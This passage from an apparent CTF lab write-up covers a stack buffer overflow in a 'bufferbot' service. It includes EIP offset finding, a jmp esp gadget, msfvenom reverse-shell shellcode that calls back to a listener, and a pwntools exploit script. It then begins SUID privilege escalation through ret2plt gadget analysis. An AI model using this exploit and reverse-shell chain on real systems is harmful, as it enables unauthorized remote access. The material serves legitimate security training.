Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Server is listening on port 9000
```

And connect once again with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
aaaabaaacaaadaaaeaaafaaagaaahaaai ......
```

And we can see this:

![Screenshot](/hard/Buffered/Images/image19.png)

We can find that the value of eip is **aank**, but for some reason gef can't search this pattern, so we need to do it kind of manually.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaaha....." | grep aank
...... aniaanjaankaanlaa ......
```

So we copy all the characters that are before of the found pattern.

And we can count the number of bytes before overwriting EIP with python.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python2 -c "print len('aaaabaaacaaadaaaeaaaf......')"
1337
```

It seems that the offset is **1337** we could make a payload with this number.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python2 -c 'print "A"*1337 + "B"*4 + "C"*200'
```

And we copy the payload and run once again the program to send all of this payload.

And when we do this we can see this:

![Screenshot](/hard/Buffered/Images/image20.png)

We overwrite EIP with **BBBB** so the offset of this register is 1337

And all that Cs is being saved in the stack.

So we can make our shellcode now to get a reverse shell on the system, with a exploit of python.

But before doing that, we need to found the address of the **stack**, we can found it with **ropper**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ropper --file bufferbot --search 'jmp esp'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: bufferbot
0x08049559: jmp esp;
```

And the address is **0x08049559**, why do this?

Because when we are going to inject our payload in the stack, and we need to jump to the stack to execute our malicious payload, remember that we got EIP and we can lead the flow of the program.

And lastly we can create our malicious shellcode with **msfvenom**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ msfvenom -n 32 -p linux/x86/shell_reverse_tcp lhost=172.17.0.1 lport=3333 -f py -o shellcode.py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Successfully added NOP sled of size 32 from x86/single_byte
Payload size: 100 bytes
Final size of py file: 510 bytes
Saved as: shellcode.py
```

And we can save all that payload into **shellcode.py** the shellcode stay in the file just in format python and is more easy and fast to import it with python, also this file have inside some NOPS before the shellcode.

Why NOPS?

The **NOPS** are basically a series of bytes that are **no operation** this **NOPS** are being saved in the stack, and those bytes are going  to not immediately execute the **shellcode**, because sometimes the addresses on the memory can be affected or be a little bit different in the target machine.

With **msfvenom**, the NOPS, instead of being \x90, will have a more obfuscated format; the exploit would still work regardless of whether the NOPS are obfuscated or not.

So im going to make the exploit.

```python
from pwn import *
from shellcode import buf

target = "127.0.0.1"
port = 9000

def exploit():
    offset = 1337

    # 0x08049559: jmp esp;

    esp = p32(0x08049559)

    payload = b"A"*offset + esp + buf

    connect = remote(target, port)
    connect.sendline(payload)
    connect.close()

if __name__ == "__main__":
    exploit()
```

Okay so im going to make another diagram with **excalidraw** to explain this.

![Screenshot](/hard/Buffered/Images/image21.png)

Okay now let's execute the Exploit.

But we need to make once again the chisel tunnel because before we shutdown the tunnel.

```r
wilson@e28272dae0de:/tmp$ ./chisel client 172.17.0.1:1234 R:9000 &
[1] 485
wilson@e28272dae0de:/tmp$ 2026/01/19 14:04:11 client: Connecting to ws://172.17.0.1:1234
2026/01/19 14:04:11 client: Connected (Latency 970.349µs)
```

Okay now let's make a **netcat** listener to receive the shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
```

Great, now let's execute the exploit and make a Buffer Overflow and let the system execute our shellcode to receive a shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 bof_shellcode.py 
[+] Opening connection to 127.0.0.1 on port 9000: Done
[*] Closed connection to 127.0.0.1 port 9000
```

And we receive this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44876
whoami
tyler
```

We are in as **tyler**!

so let's make a treatment of the shell once again.

---
# Privilege Escalation

In the Home directory of the user **tyler** we can see this binary:

```r
tyler@e28272dae0de:/home/tyler$ ls -l
total 20
-rwsr-xr-x 1 root root 16488 Jul 30  2024 shell
```

We can see that the propietary of this binary is the user root.

```d
tyler@e28272dae0de:/home/tyler$ ./shell 
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣤⡾⠻⠫⣦⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣰⡲⡿⢳⣦⡀⠄⠄⠸⠉⠇⠄⢀⣾⡃⠄⠄⠄⣠⣦⡿⣷⣤⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠸⠯⠁⠄⠈⣗⡃⠄⠄⠠⠒⠄⣠⡺⠎⠁⠄⠄⢘⣳⠃⠄⠈⠭⠷⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠒⢶⠄⢠⣽⢣⣄⠄⠄⢠⣶⠋⢠⡀⠄⠄⢀⣄⢯⣄⠄⠰⠖⠂⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣆⢶⢰⣄⠄⢁⢢⠶⠁⠃⢻⢷⠄⣶⡏⠄⠩⣿⠄⣸⠎⠋⠈⠷⡄⢏⠁⡠⣶⣶⣶⣄⠄⠄⠄⠄
⠄⠄⠄⢶⢏⠤⡀⣼⠄⠁⣼⡏⢰⣦⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⣶⢸⣷⠄⠄⣿⠄⡠⢬⡶⠄⠄⠄⠄
⠄⠄⠄⠄⡁⠩⡃⢻⠄⠄⠹⣇⢸⣿⠄⠄⣠⠤⠄⠄⠄⠠⣤⠄⠄⠄⣿⡸⡏⠄⠄⡿⠘⢌⢃⠁⠄⠄⠄⠄
⠄⠄⠄⠄⡀⣀⡀⠈⢷⡄⡄⣠⢸⣿⠄⠄⢿⣌⠐⠄⠰⢈⣼⠇⠄⠄⣿⣌⣀⣤⡜⠋⢀⣀⣀⡀⠄⠄⠄⠄
⠄⠄⠠⠬⠛⠘⠻⣦⠄⠈⠁⣡⢸⣿⠄⠈⣄⣀⢀⡀⣀⢀⢀⠆⠄⠄⣿⣌⠉⠁⠄⣔⡟⠛⠛⠯⠄⠄⠄⠄
⠄⠄⡈⠲⠁⠄⠄⢺⣣⢰⡼⠏⢸⣿⠄⠄⠈⠟⢸⡇⡿⠘⠈⠄⠄⠄⣿⢓⡟⣶⣶⡛⠂⠄⠸⠖⠪⠄⠄⠄
⠄⠄⢇⠉⠄⠄⠄⠄⠈⢈⣁⣀⢸⣿⣶⣶⣶⣶⣶⣶⢶⡶⣶⣶⣶⡶⣿⡀⣀⡉⠈⠄⠄⠄⠄⠋⠄⠄⠄⠄
⠄⠄⠈⣐⡻⠹⠷⠄⠰⡟⠘⠋⠄⠄⣀⡠⠠⢤⠄⠤⠄⣤⠤⠄⣀⠄⠄⠁⠙⢛⡷⠄⠴⠟⢾⣂⠄⠄⠄⠄
⠄⠄⠄⣭⡇⠄⠅⢀⢛⠂⠄⣠⣤⢶⡿⠂⢨⣳⠄⣻⡃⢚⣧⠄⠚⣵⣠⣄⡀⠄⣻⡃⡻⡀⠄⣭⡇⠄⠄⠄
⠄⠄⠄⠹⣾⣄⣤⡼⡓⢀⣾⠏⠉⠄⣀⣠⡺⡍⠄⣽⡅⠸⡿⣦⢀⠄⠈⠩⣷⡄⠸⡫⣠⡤⣶⠊⠄⠄⠄⠄
⠄⠄⠄⠄⠈⢠⡍⠉⠄⠐⣭⡤⣴⢿⡭⣯⣥⣤⣤⢯⢤⣤⡤⣭⡬⣽⢷⣤⡭⠱⠄⠄⢩⠁⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠁⠄⠄⣜⣾⠭⠍⠬⠡⠍⠬⠅⠭⠨⠨⠨⠅⠍⠥⠩⠌⠥⢻⡽⡀⠄⠈⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⡜⣾⠣⠍⠭⠡⠭⠨⠭⠥⠭⠬⠬⠬⡁⠥⠩⠍⠭⠩⠝⣿⡱⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠨⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠵⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Mon Jan 19 14:24:40 CST 2026
# whoami
root?
# id
uid=0(root?) gid=0(root?) groups=0(root?)
# ls -la
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
```

We can see that only we can execute "commands" on the system, but what if we execute a lot As?

```d
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ......
[!] YOU GOT R007 - C0NGR47ULA710N5 [!]
Segmentation fault
```

We can see once again a BoF, so let's transfer this binary with us using a python server and download it with wget.

```r
tyler@e28272dae0de:/home/tyler$ python3 -m http.server 100 
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Let's transfer this binary.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ wget http://172.17.0.2:100/shell 
--2026-01-19 15:29:34--  http://172.17.0.2:100/shell
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16488 (16K) [application/octet-stream]
Saving to: ‘shell’

shell                                                       100%[==================================================>]  16.10K  --.-KB/s    in 0s      

2026-01-19 15:29:34 (351 MB/s) - ‘shell’ saved [16488/16488]
```

When we try to execute it show us a error:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./shell 
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣤⡾⠻⠫⣦⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣰⡲⡿⢳⣦⡀⠄⠄⠸⠉⠇⠄⢀⣾⡃⠄⠄⠄⣠⣦⡿⣷⣤⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠸⠯⠁⠄⠈⣗⡃⠄⠄⠠⠒⠄⣠⡺⠎⠁⠄⠄⢘⣳⠃⠄⠈⠭⠷⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠒⢶⠄⢠⣽⢣⣄⠄⠄⢠⣶⠋⢠⡀⠄⠄⢀⣄⢯⣄⠄⠰⠖⠂⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣆⢶⢰⣄⠄⢁⢢⠶⠁⠃⢻⢷⠄⣶⡏⠄⠩⣿⠄⣸⠎⠋⠈⠷⡄⢏⠁⡠⣶⣶⣶⣄⠄⠄⠄⠄
⠄⠄⠄⢶⢏⠤⡀⣼⠄⠁⣼⡏⢰⣦⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⣶⢸⣷⠄⠄⣿⠄⡠⢬⡶⠄⠄⠄⠄
⠄⠄⠄⠄⡁⠩⡃⢻⠄⠄⠹⣇⢸⣿⠄⠄⣠⠤⠄⠄⠄⠠⣤⠄⠄⠄⣿⡸⡏⠄⠄⡿⠘⢌⢃⠁⠄⠄⠄⠄
⠄⠄⠄⠄⡀⣀⡀⠈⢷⡄⡄⣠⢸⣿⠄⠄⢿⣌⠐⠄⠰⢈⣼⠇⠄⠄⣿⣌⣀⣤⡜⠋⢀⣀⣀⡀⠄⠄⠄⠄
⠄⠄⠠⠬⠛⠘⠻⣦⠄⠈⠁⣡⢸⣿⠄⠈⣄⣀⢀⡀⣀⢀⢀⠆⠄⠄⣿⣌⠉⠁⠄⣔⡟⠛⠛⠯⠄⠄⠄⠄
⠄⠄⡈⠲⠁⠄⠄⢺⣣⢰⡼⠏⢸⣿⠄⠄⠈⠟⢸⡇⡿⠘⠈⠄⠄⠄⣿⢓⡟⣶⣶⡛⠂⠄⠸⠖⠪⠄⠄⠄
⠄⠄⢇⠉⠄⠄⠄⠄⠈⢈⣁⣀⢸⣿⣶⣶⣶⣶⣶⣶⢶⡶⣶⣶⣶⡶⣿⡀⣀⡉⠈⠄⠄⠄⠄⠋⠄⠄⠄⠄
⠄⠄⠈⣐⡻⠹⠷⠄⠰⡟⠘⠋⠄⠄⣀⡠⠠⢤⠄⠤⠄⣤⠤⠄⣀⠄⠄⠁⠙⢛⡷⠄⠴⠟⢾⣂⠄⠄⠄⠄
⠄⠄⠄⣭⡇⠄⠅⢀⢛⠂⠄⣠⣤⢶⡿⠂⢨⣳⠄⣻⡃⢚⣧⠄⠚⣵⣠⣄⡀⠄⣻⡃⡻⡀⠄⣭⡇⠄⠄⠄
⠄⠄⠄⠹⣾⣄⣤⡼⡓⢀⣾⠏⠉⠄⣀⣠⡺⡍⠄⣽⡅⠸⡿⣦⢀⠄⠈⠩⣷⡄⠸⡫⣠⡤⣶⠊⠄⠄⠄⠄
⠄⠄⠄⠄⠈⢠⡍⠉⠄⠐⣭⡤⣴⢿⡭⣯⣥⣤⣤⢯⢤⣤⡤⣭⡬⣽⢷⣤⡭⠱⠄⠄⢩⠁⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠁⠄⠄⣜⣾⠭⠍⠬⠡⠍⠬⠅⠭⠨⠨⠨⠅⠍⠥⠩⠌⠥⢻⡽⡀⠄⠈⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⡜⣾⠣⠍⠭⠡⠭⠨⠭⠥⠭⠬⠬⠬⡁⠥⠩⠍⠭⠩⠝⣿⡱⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠨⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠵⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Mon 19 Jan 2026 15:39:15 -05
setuid: Operation not permitted
```

It seems that it changes the suid of the user. So we need to execute the following commands:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sudo chown root:root shell
```

We change the proprietary of the binary to root.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sudo chmod +sxr shell
```

We add some permissions to the binary: S (SUID), X (Execute), R (Read).

And after doing  that, we can execute the binary as in the target machine.

```d
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./shell 
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣤⡾⠻⠫⣦⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣰⡲⡿⢳⣦⡀⠄⠄⠸⠉⠇⠄⢀⣾⡃⠄⠄⠄⣠⣦⡿⣷⣤⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠸⠯⠁⠄⠈⣗⡃⠄⠄⠠⠒⠄⣠⡺⠎⠁⠄⠄⢘⣳⠃⠄⠈⠭⠷⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠒⢶⠄⢠⣽⢣⣄⠄⠄⢠⣶⠋⢠⡀⠄⠄⢀⣄⢯⣄⠄⠰⠖⠂⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣆⢶⢰⣄⠄⢁⢢⠶⠁⠃⢻⢷⠄⣶⡏⠄⠩⣿⠄⣸⠎⠋⠈⠷⡄⢏⠁⡠⣶⣶⣶⣄⠄⠄⠄⠄
⠄⠄⠄⢶⢏⠤⡀⣼⠄⠁⣼⡏⢰⣦⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⣶⢸⣷⠄⠄⣿⠄⡠⢬⡶⠄⠄⠄⠄
⠄⠄⠄⠄⡁⠩⡃⢻⠄⠄⠹⣇⢸⣿⠄⠄⣠⠤⠄⠄⠄⠠⣤⠄⠄⠄⣿⡸⡏⠄⠄⡿⠘⢌⢃⠁⠄⠄⠄⠄
⠄⠄⠄⠄⡀⣀⡀⠈⢷⡄⡄⣠⢸⣿⠄⠄⢿⣌⠐⠄⠰⢈⣼⠇⠄⠄⣿⣌⣀⣤⡜⠋⢀⣀⣀⡀⠄⠄⠄⠄
⠄⠄⠠⠬⠛⠘⠻⣦⠄⠈⠁⣡⢸⣿⠄⠈⣄⣀⢀⡀⣀⢀⢀⠆⠄⠄⣿⣌⠉⠁⠄⣔⡟⠛⠛⠯⠄⠄⠄⠄
⠄⠄⡈⠲⠁⠄⠄⢺⣣⢰⡼⠏⢸⣿⠄⠄⠈⠟⢸⡇⡿⠘⠈⠄⠄⠄⣿⢓⡟⣶⣶⡛⠂⠄⠸⠖⠪⠄⠄⠄
⠄⠄⢇⠉⠄⠄⠄⠄⠈⢈⣁⣀⢸⣿⣶⣶⣶⣶⣶⣶⢶⡶⣶⣶⣶⡶⣿⡀⣀⡉⠈⠄⠄⠄⠄⠋⠄⠄⠄⠄
⠄⠄⠈⣐⡻⠹⠷⠄⠰⡟⠘⠋⠄⠄⣀⡠⠠⢤⠄⠤⠄⣤⠤⠄⣀⠄⠄⠁⠙⢛⡷⠄⠴⠟⢾⣂⠄⠄⠄⠄
⠄⠄⠄⣭⡇⠄⠅⢀⢛⠂⠄⣠⣤⢶⡿⠂⢨⣳⠄⣻⡃⢚⣧⠄⠚⣵⣠⣄⡀⠄⣻⡃⡻⡀⠄⣭⡇⠄⠄⠄
⠄⠄⠄⠹⣾⣄⣤⡼⡓⢀⣾⠏⠉⠄⣀⣠⡺⡍⠄⣽⡅⠸⡿⣦⢀⠄⠈⠩⣷⡄⠸⡫⣠⡤⣶⠊⠄⠄⠄⠄
⠄⠄⠄⠄⠈⢠⡍⠉⠄⠐⣭⡤⣴⢿⡭⣯⣥⣤⣤⢯⢤⣤⡤⣭⡬⣽⢷⣤⡭⠱⠄⠄⢩⠁⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠁⠄⠄⣜⣾⠭⠍⠬⠡⠍⠬⠅⠭⠨⠨⠨⠅⠍⠥⠩⠌⠥⢻⡽⡀⠄⠈⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⡜⣾⠣⠍⠭⠡⠭⠨⠭⠥⠭⠬⠬⠬⡁⠥⠩⠍⠭⠩⠝⣿⡱⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠨⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠭⠵⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Mon 19 Jan 2026 16:36:38 -05
# whoami
root?
```

Let's see a little bit of information of this binary with **file**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ file shell
shell: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=137bd5981401f47039690cfee3ac82eb128a9eba, for GNU/Linux 3.2.0, not stripped
```

We can see that is a executable of 64 bits, no stripped.o 

Okay so we can use GDB to see more information of this binary.

In my case im using an alias (**sgdb**) that does this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ which sgdb
sgdb: aliased to sudo -E gdb
```

With this we can execute GDB with the plugin of GEF because if we don't do this the plugin won't load. As the user root willpreserve the environment of the user that is being currently executing sudo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ sgdb -q shell 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from shell...
(No debugging symbols found in shell)
gef➤
```

We can try to see what protections have this binary.

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/buffered/files/shell'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

In this case we can't use shellcodes to execute arbitrary commands in the system because NX (Not Executable) is enabled.

I'm going to make use of **Ghidra** to do a little bit of reverse engineering and see what it does this executable more deeply.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ghidra
```

In this binary have 3 principal functions; ```main, pwnme, _date```

Basically the **main** function checks if the setuid (Set User Id) and the setgid (Set Group Id) are equal to 0 (root), if don't it show a error, else if the Setuid and the Setgid is equal to 0, the main function are going to call the function **pwnme**.

Pwnme asks the user input, if is equal to **whoami** or **id** are going to show a output like the normal commands on linux, but it doesn't, or even if the user input is equal to **date**, the function are going to call the function ```_date```, or else will show a message "You are root..."


```_date``` calls the function system and executes the command **date**, and are going to show the date of the system, unfortunately the script gives all the path of the command date avoiding a Path hijacking.

So what to do now?

Nothing is over, it exists 2 functions that are very interesting hidden in the binary: ```_x1, _x2```

To create a malicious payload, we need to use ret2plt.

What is Ret2plt?

Ret2plt is a technique that is a type of attack In buffer overflows, allowing the attacker execute arbitrary code by redirecting the flow of the program to another function more in specific: **Procedure Linkage Table**.

Plt is basically a way to call functions of C for example in this binary we have **system@plt** this can call the original function of system without knowing the real address of the function system.

Why we do this?

Because in the target machine they have ASLR (Address Space Layout Randomization) activated, this part of the system can have 3 states:

- 0 (No randomness, static memory addresses)
- 1 (Parcial Randomness, this can make the address for example of the stack and other registers be random)
- 2 (Total Randomness, All the memory is random and we can't predict them)

In this system the ASLR is set to 2.

```r
tyler@e28272dae0de:/home/tyler$ cat /proc/sys/kernel/randomize_va_space 
2
```


So with this technique we can **bypass** this restriction and taking advantage that PIE (Pointer Independent Executable) is disabled, this means that the INTERNAL addresses of the binary will be static.

Okay so we need to make a payload that follows in the following order:

- **RDI, RSI, RDX, R10** ....

Don't worry we are going to only use **RDI: Destination index for string operations.**

The payload will look something like this:

System call            RDI
System               "/bin/sh"

And will look something like this: **system("/bin/sh")**

Okay so how can we put /bin/sh into the register **RDI**?

In this binary will be a little bit more complicated, because we don't have a **instruction** that we can directly put this string inside of it.

We need to analyze the functions ```_x1, _x2``` and read what it does.

```r
gef➤  disas _x1
Dump of assembler code for function _x1:
   0x0000000000401499 <+0>:     push   rbp
   0x000000000040149a <+1>:     mov    rbp,rsp
   0x000000000040149d <+4>:     pop    r13
   0x000000000040149f <+6>:     ret
   0x00000000004014a0 <+7>:     nop
   0x00000000004014a1 <+8>:     pop    rbp
   0x00000000004014a2 <+9>:     ret
```

This is the ```_x1``` function and all his assembly code.

The interesting part is we can use the **pop r13** for the next function ```_x2```

```r
gef➤  disas _x2
Dump of assembler code for function _x2:
   0x00000000004014a3 <+0>:     push   rbp
   0x00000000004014a4 <+1>:     mov    rbp,rsp
   0x00000000004014a7 <+4>:     mov    rdi,rsp
   0x00000000004014aa <+7>:     jmp    r13
   0x00000000004014ad <+10>:    nop
   0x00000000004014ae <+11>:    pop    rbp
   0x00000000004014af <+12>:    ret
